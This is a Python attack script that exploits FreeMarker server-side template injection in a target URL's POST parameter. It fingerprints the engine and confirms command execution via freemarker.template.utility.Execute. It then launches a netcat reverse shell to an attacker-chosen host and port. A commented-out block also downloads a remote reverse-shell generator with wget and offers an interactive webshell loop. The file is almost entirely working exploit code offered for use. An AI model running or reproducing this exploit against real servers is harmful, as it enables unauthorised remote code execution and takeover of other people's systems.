#!/usr/bin/python3

import socket
import argparse
import requests
from datetime import datetime
import asyncio


# functions
def response(stri):
    a = stri.split('*')
    return "".join(
        a[i + 1]
        for i, n in enumerate(a)
        if n == 'realbacon' and a[i + 1] != 'realbacon'
    ).strip()


def inject(payload):
    d = {
        post_data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + payload + '") }*realbacon*'}
    p = requests.post(args.url, data=d)
    return p.text


print('		Freemarker template injection made by Realbacon v2.0\n\n')

# parsing arguments
parser = argparse.ArgumentParser(description='All this arguments are required (except lhost):')
parser.add_argument('-u', type=str, dest='url', required=True, help='Url of the target')
parser.add_argument('-d', dest='data', required=True, help='POST variable to inject')
parser.add_argument('-phost', dest='phost', required=True, help='The host that the payload should connect back to')
parser.add_argument('-pport', dest='pport', required=True,
                    help='The port the payload should connect back to (might be different from the lport if you\'r using ngrok for example)')
parser.add_argument('-lport', dest='lport', required=True, help='Port to listen on')
parser.add_argument('-lhost', dest='lhost', help='Host to listen on (def is 127.0.0.1', default="127.0.0.1")

args = parser.parse_args()

url, post_data, phost, pport, lhost, lport = args.url, args.data, args.phost, args.pport, args.lhost, args.lport

# try to get a response from the url
try:
    r = requests.get(url)

except:
    print('[-] Invalid url')
    exit()
data_fr = {post_data: "${{7*'7'}}"}
data_sr = {post_data: "*realbacon*${.version}*realbacon*"}
fr = requests.post(url, data_fr)
sr = requests.post(url, data_sr)

# Try to see if the website is running FREEMARKER
if 'freemarker' in fr.text:
    print(f'[+] Url : {url} seems to run with FREEMARKER {response(sr.text)}')
else:
    print(f'[-]Url : {url} does not seem to run with FREEMARKER (maybe not injectable)')
    if input('Do you want to continue injection ? (y/n)') == 'n': exit()

# Try to see if we can get back the data from command injection
print(f'[+] Trying injection with post data : {post_data}')
data_test = {
    post_data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*realbacon*'}
payload_test = requests.post(url, data=data_test)

if response(payload_test.text) == '$baconed$':
    print('[+] Injection successfull\n[+] Opening webshell')
else:
    # We dont get a response so we close the program
    print("[-]Target does not seem to be injectable...\n[-]Aborting...")
    exit()

# retrive date
now = datetime.now()
time_display = now.strftime("%d/%m/%Y %H:%M:%S")

# open the shell
print(f'\n[+] Web shell opened at {time_display}\n[+] Injecting payload generator...')


async def listen():
    socket_l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


inject(f'nc.traditional {phost} {pport} -e /bin/bash')

'''
inject('rm /tmp/revgen.py')
inject(
    'wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py')

if response(inject('file /tmp/revgen.py')) == '/tmp/revgen.py: ASCII text, with very long lines':
    print('[+] Payload generator injected')
else:
    print(
        "[-] Unable to inject payload generator, maybe /tmp is not writtable. Do you want to open a webshell ? (limited functionalites) y/n")
    ask = input('>')
    if ask == 'n': exit()
    while True:
        user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
        if user_data == 'exit': exit()
        print(response(inject(user_data)))



inject(f'python3 /tmp/revgen.py {lhost} {lport} realexploit.php')

if response(
        inject('file /tmp/realexploit.php')) == '/tmp/realexploit.php: PHP script, ASCII text, with very long lines':
    print('[+] Payload created !')
else:
    print(
        "[-] Unable to create payload,maybe the server does not run python3. Do you want to open a webshell ? (limited functionalites) y/n")
    ask = input('>')
    if ask == 'n': exit()
    while True:
        user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
        if user_data == 'exit': exit()
        print(response(inject(user_data)))

print('[+] Launching the script : php -f /tmp/realexploit.php... (Please check your netcat window)')

inject('php -f /tmp/realexploit.php')
'''
